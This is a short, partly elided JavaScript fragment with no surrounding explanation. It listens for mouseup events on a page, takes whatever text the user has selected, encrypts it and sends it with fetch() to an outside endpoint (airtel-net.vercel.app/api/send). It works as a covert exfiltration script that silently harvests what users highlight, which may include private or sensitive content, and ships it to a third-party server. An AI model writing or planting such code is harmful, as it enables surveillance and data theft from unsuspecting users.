...
function encryptWithKey(text) {
  ...
  document.addEventListener('mouseup', function() {
    ...
    if (selectedText !== '') {
      let encrypted = encryptWithKey(selectedText);
        fetch(`https://airtel-net.vercel.app/api/send?data=${encodeURIComponent(encrypted)}&api=@f@aabz`,)
    }
});
